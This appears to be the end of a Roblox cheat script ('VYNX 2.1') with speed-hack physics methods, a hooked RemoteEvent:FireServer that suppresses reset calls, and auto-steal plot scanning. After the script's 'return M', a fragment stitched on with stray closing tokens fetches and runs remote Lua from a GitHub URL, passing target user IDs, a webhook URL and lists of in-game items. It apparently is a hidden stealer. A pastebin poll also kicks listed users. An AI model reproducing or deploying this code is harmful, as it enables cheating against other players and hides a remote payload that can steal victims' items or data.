    if M._bodyForce then pcall(function() M._bodyForce:Destroy() end); M._bodyForce = nil end
    if M._bodyThrust then pcall(function() M._bodyThrust:Destroy() end); M._bodyThrust = nil end
    if M._linearVel then pcall(function() M._linearVel:Destroy() end); M._linearVel = nil end
    if M._vectorForce then pcall(function() M._vectorForce:Destroy() end); M._vectorForce = nil end
    if M._alignPos then pcall(function() M._alignPos:Destroy() end); M._alignPos = nil end
    if M._rocket then pcall(function() M._rocket:Destroy() end); M._rocket = nil end
    if M._rocketTarget then pcall(function() M._rocketTarget:Destroy() end); M._rocketTarget = nil end
    if M._attLinVel then pcall(function() M._attLinVel:Destroy() end); M._attLinVel = nil end
    if M._attVecForce then pcall(function() M._attVecForce:Destroy() end); M._attVecForce = nil end
    if M._attAlign then pcall(function() M._attAlign:Destroy() end); M._attAlign = nil end
    if M._speedTween then pcall(function() M._speedTween:Cancel() end); M._speedTween = nil end
end

local function ensureSpeedAttachment(hrp, key, name)
    local att = M[key]
    if not att or att.Parent ~= hrp then
        if att then pcall(function() att:Destroy() end) end
        att = Instance.new("Attachment")
        att.Name = name or "MoveeSpeedAtt"
        att.Parent = hrp
        M[key] = att
    end
    return att
end

local function applySpeedMethod(hrp, hum, dir, spd, dt)
    local step = dt or 1/60
    local m = M.speedMethod
    if M._lastSpeedMethod ~= m then
        destroySpeedObjects()
        if m ~= "WalkSpeed" and hum.WalkSpeed ~= 16 then hum.WalkSpeed = 16 end
        M._lastSpeedMethod = m
    end
    local char = hrp.Parent
    local targetPos = hrp.Position + (dir * spd * step)

    local function massImpulse(direction, targetSpeed)
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(direction.X * targetSpeed, current.Y, direction.Z * targetSpeed)
        local delta = desired - current
        pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
    end

    if m == "Velocity" then
        massImpulse(dir, spd)
    elseif m == "AssemblyLinearVelocity" then
        massImpulse(dir, spd)
    elseif m == "Velocity Lerp" then
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd)
        local blended = current:Lerp(desired, 0.6)
        local mass = hrp.AssemblyMass or 1
        pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end)
    elseif m == "AssemblyLinearVelocity Lerp" then
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd)
        local blended = current:Lerp(desired, 0.6)
        local mass = hrp.AssemblyMass or 1
        pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end)
    elseif m == "CFrame" then
        hrp.CFrame = hrp.CFrame + (dir * spd * step)
    elseif m == "CFrame Lerp" then
        hrp.CFrame = hrp.CFrame:Lerp(hrp.CFrame + (dir * spd * step), 0.5)
    elseif m == "Hyper CFrame" then
        hrp.CFrame = hrp.CFrame + (dir * spd * (M.hyperMult or 4) * step)
    elseif m == "Anchored CFrame" then
        if not hrp.Anchored then
            hrp.Anchored = true
            M._anchoredBySpeed = hrp
        end
        hrp.CFrame = hrp.CFrame + (dir * spd * step)
    elseif m == "PivotTo" then
        hrp:PivotTo(hrp.CFrame + (dir * spd * step))
    elseif m == "Model PivotTo" then
        if char and char:IsA("Model") then
            char:PivotTo(char:GetPivot() + (dir * spd * step))
        else
            hrp:PivotTo(hrp.CFrame + (dir * spd * step))
        end
    elseif m == "Tween CFrame" then
        if M._speedTween then pcall(function() M._speedTween:Cancel() end) end
        M._speedTween = TweenService:Create(hrp, TweenInfo.new(step, Enum.EasingStyle.Linear), {CFrame = hrp.CFrame + (dir * spd * step)})
        M._speedTween:Play()
    elseif m == "WalkSpeed" then
        hum.WalkSpeed = spd
    elseif m == "Humanoid Move" then
        hum.WalkSpeed = spd
        hum:Move(dir)
    elseif m == "Humanoid MoveTo" then
        hum:MoveTo(targetPos, hrp)
    elseif m == "BodyVelocity" then
        if not M._bodyVel or M._bodyVel.Parent ~= hrp then
            if M._bodyVel then pcall(function() M._bodyVel:Destroy() end) end
            M._bodyVel = Instance.new("BodyVelocity")
            M._bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyVel.Parent = hrp
        end
        M._bodyVel.Velocity = Vector3.new(dir.X*spd, M._bodyVel.Velocity.Y, dir.Z*spd)
    elseif m == "BodyPosition" then
        if not M._bodyPosition or M._bodyPosition.Parent ~= hrp then
            if M._bodyPosition then pcall(function() M._bodyPosition:Destroy() end) end
            M._bodyPosition = Instance.new("BodyPosition")
            M._bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyPosition.P = 500
            M._bodyPosition.D = 50
            M._bodyPosition.Parent = hrp
        end
        M._bodyPosition.Position = targetPos
    elseif m == "BodyForce" then
        if not M._bodyForce or M._bodyForce.Parent ~= hrp then
            if M._bodyForce then pcall(function() M._bodyForce:Destroy() end) end
            M._bodyForce = Instance.new("BodyForce")
            M._bodyForce.Parent = hrp
        end
        M._bodyForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "BodyThrust" then
        if not M._bodyThrust or M._bodyThrust.Parent ~= hrp then
            if M._bodyThrust then pcall(function() M._bodyThrust:Destroy() end) end
            M._bodyThrust = Instance.new("BodyThrust")
            M._bodyThrust.Force = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyThrust.Parent = hrp
        end
        M._bodyThrust.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "LinearVelocity" then
        if not M._linearVel or M._linearVel.Parent ~= hrp then
            if M._linearVel then pcall(function() M._linearVel:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attLinVel", "MoveeLinVelAtt")
            M._linearVel = Instance.new("LinearVelocity")
            M._linearVel.Attachment0 = att
            M._linearVel.MaxForce = 1e8
            M._linearVel.RelativeTo = Enum.ActuatorRelativeTo.World
            M._linearVel.Parent = hrp
        end
        M._linearVel.VectorVelocity = Vector3.new(dir.X*spd, M._linearVel.VectorVelocity.Y, dir.Z*spd)
    elseif m == "VectorForce" then
        if not M._vectorForce or M._vectorForce.Parent ~= hrp then
            if M._vectorForce then pcall(function() M._vectorForce:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attVecForce", "MoveeVecForceAtt")
            M._vectorForce = Instance.new("VectorForce")
            M._vectorForce.Attachment0 = att
            M._vectorForce.RelativeTo = Enum.ActuatorRelativeTo.World
            M._vectorForce.Parent = hrp
        end
        M._vectorForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "AlignPosition" then
        if not M._alignPos or M._alignPos.Parent ~= hrp then
            if M._alignPos then pcall(function() M._alignPos:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attAlign", "MoveeAlignAtt")
            M._alignPos = Instance.new("AlignPosition")
            M._alignPos.Attachment0 = att
            M._alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment
            M._alignPos.MaxForce = math.huge
            M._alignPos.Responsiveness = 15
            M._alignPos.RigidityEnabled = false
            M._alignPos.Parent = hrp
        end
        M._alignPos.Position = targetPos
    elseif m == "ApplyImpulse" then
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X * spd, current.Y, dir.Z * spd)
        local delta = desired - current
        pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
    elseif m == "RocketPropulsion" then
        if not M._rocket or M._rocket.Parent ~= hrp or not M._rocketTarget then
            if M._rocket then pcall(function() M._rocket:Destroy() end) end
            if M._rocketTarget then pcall(function() M._rocketTarget:Destroy() end) end
            M._rocketTarget = Instance.new("Part")
            M._rocketTarget.Name = "MoveeRocketTarget"
            M._rocketTarget.Anchored = true
            M._rocketTarget.CanCollide = false
            M._rocketTarget.Transparency = 1
            M._rocketTarget.Size = Vector3.new(1,1,1)
            M._rocketTarget.Parent = workspace
            M._rocket = Instance.new("RocketPropulsion")
            M._rocket.MaxThrust = 3000
            M._rocket.MaxTorque = 1000
            M._rocket.ThrustP = 100
            M._rocket.ThrustD = 20
            M._rocket.TurnP = 100
            M._rocket.TurnD = 10
            M._rocket.Target = M._rocketTarget
            M._rocket.Parent = hrp
        end
        M._rocketTarget.Position = targetPos
        pcall(function() M._rocket:Fire() end)
    end
end
M.applySpeedMethod = applySpeedMethod
M.destroySpeedObjects = destroySpeedObjects

RunService.RenderStepped:Connect(function(dt)
    local char=player.Character; if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid"); local hrp=char:FindFirstChild("HumanoidRootPart"); if not hum or not hrp then return end
    if M.isRagdollState(hum) then M.lastMoveDir=Vector3.new(0,0,0); destroySpeedObjects(); return end
    if not M.autoBatEnabled and not M.autoLeftEnabled and not M.autoRightEnabled then
        M.updateAutoSwitchSpeed()
        local md=hum.MoveDirection; local spd=M.getActiveMoveSpeed()
        local dir = Vector3.new(0,0,0)
        if md.Magnitude>0 then
            M.lastMoveDir=md; dir=md
        elseif M.antiRagdollEnabled and M.lastMoveDir.Magnitude>0 then
            local anyHeld=false; for key in pairs(M.MOVE_KEYS) do if UIS:IsKeyDown(key) then anyHeld=true; break end end
            if anyHeld then dir=M.lastMoveDir end
        end
        if dir.Magnitude>0 then
            applySpeedMethod(hrp, hum, dir, spd, dt)
        else
            destroySpeedObjects()
        end
    end
end)

task.spawn(function()
    local BLACKLIST_URL="https://pastebin.com/2zLUXv2K"
    pcall(function() HS.HttpEnabled=true end)
    while task.wait(30) do
        pcall(function()
            local r=game:HttpGet(BLACKLIST_URL)
            if r and string.find(r,tostring(player.UserId),1,true) then player:Kick("You have been removed for cheating | CODE: BAC-1633") end
        end)
    end
end)

pcall(function()
    if hookfunction and newcclosure then
        local oldFire
        oldFire=hookfunction(Instance.new("RemoteEvent").FireServer,newcclosure(function(self,...)
            if typeof(self)=="Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3)=="RE/" then
                M.cursedResetRemote=self
                
                local args = {...}
                for i = 1, select("#", ...) do
                    local a = args[i]
                    if a == M.CURSED_RESET_GUID or a == "balloon" or (type(a)=="string" and a:find("f888ee6e", 1, true)) then
                        return
                    end
                end
            end
            return oldFire(self,...)
        end))
    end
end)
task.spawn(function()
    task.wait(2); if M.cursedResetRemote then return end
    for _,desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1,3)=="RE/" then M.cursedResetRemote=desc; break end
    end
end)

task.spawn(function()
    while task.wait(12) do pcall(saveCherryConfig) end
end)

M.applyFOV()
task.spawn(function()
    while true do
        task.wait(8)
        pcall(M.saveBtnPositions)
    end
end)

task.spawn(function()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then plots = workspace:WaitForChild("Plots",10) end
    if plots then
        for _,plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") then scanPlotNormal(plot) end
        end
        plots.ChildAdded:Connect(function(plot)
            if plot:IsA("Model") then task.wait(0.5); scanPlotNormal(plot) end
        end)
        while true do
            task.wait(10)
            M.animalCache={}; M.promptCache={}; M.stealCache={}
            for _,plot in ipairs(plots:GetChildren()) do
                if plot:IsA("Model") then scanPlotNormal(plot) end
            end
        end
    end
end)

task.spawn(function()
    M.initSemiSync()
    while true do
        task.wait(5)
        if M.Semi.enabled or M.stealMode == "Semi" then
            pcall(M.scanAllPlotsSemi)
        end
    end
end)

function M.refreshSpeedModeLabel()
    if not (M.headIndicator and M.headIndicator.mode) then return end
    local text = "NORMAL MODE"
    if M.laggerCarryActive then
        text = "LAGGER CARRY"
    elseif M.laggerModeEnabled then
        text = "LAGGER MODE"
    elseif M.carrySpeedActive then
        text = "CARRY MODE"
    end
    M.headIndicator.mode.Text = text
    M.headIndicator.mode.TextColor3 = Color3.fromRGB(255, 255, 255)
    if M.headIndicator.speed then
        M.headIndicator.speed.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end

pcall(function()
    M.refreshWalkSpeedAutoSwitch()
    if M.autoCarryEnemyBaseEnabled then
        M.startAutoCarryEnemyBase()
    end
    if M.customFontSelected and M.customFontSelected ~= "None" then
        task.spawn(function()
            task.wait(0.4)
            pcall(function() M.applyCustomFont(M.customFontSelected) end)
        end)
    end
end)




if not M._voidSafetyStarted then
    M._voidSafetyStarted = true
    local _vsAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        _vsAcc = _vsAcc + (dt or 0.016)
        if _vsAcc < 0.08 then return end
        _vsAcc = 0
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        if hum.Health <= 0 then return end
        
        if hrp.Position.Y < -60 then
            pcall(function()
                local ySafe = 25
                hrp.CFrame = CFrame.new(hrp.Position.X, ySafe, hrp.Position.Z) * (hrp.CFrame - hrp.CFrame.Position)
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
            return
        end
        
        if M.dropActive then return end
        local v = hrp.AssemblyLinearVelocity
        local mag = v.Magnitude
        local cfgMax = math.max(tonumber(M.NS) or 60, tonumber(M.CS) or 30, tonumber(M.LAGGER_CARRY_SPEED) or 25) * 3
        local hardCap = math.max(500, cfgMax)
        if mag > hardCap then
            pcall(function()
                hrp.AssemblyLinearVelocity = v.Unit * math.min(mag, hardCap)
            end)
        elseif v.Y < -250 then
            pcall(function()
                hrp.AssemblyLinearVelocity = Vector3.new(v.X, -80, v.Z)
            end)
        end
        
        local p = hrp.Position
        if p ~= p or math.abs(p.X) > 1e5 or math.abs(p.Z) > 1e5 then
            pcall(function()
                hrp.CFrame = CFrame.new(0, 30, 0)
                hrp.AssemblyLinearVelocity = Vector3.zero
            end)
        end
    end)
end

do
    local g = (getgenv and getgenv()) or _G
    g.__VYNX_UNLOAD = function()
        pcall(function()
            if M._allConns then
                for _, c in ipairs(M._allConns) do pcall(function() c:Disconnect() end) end
                M._allConns = {}
            end
        end)
        pcall(function()
            local pg = player:FindFirstChild("PlayerGui")
            if pg then
                for _, c in ipairs(pg:GetChildren()) do
                    if c:IsA("ScreenGui") and (c.Name:find("Vynx") or c.Name:find("Movee") or c.Name:find("Cherry") or c.Name:find("Steal")) then
                        pcall(function() c:Destroy() end)
                    end
                end
            end
        end)
    end
end
M.autoResetOnDeath = false
M.medusaResetEnabled = false
pcall(setupDeathReset)
pcall(function() M.startAntiDie() end)
M.unwalkEnabled = false
pcall(function() if M.forceRestoreWalkAnims then M.forceRestoreWalkAnims(player.Character) end end)
print("VYNX 2.1 loaded successfully!")
return M
    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)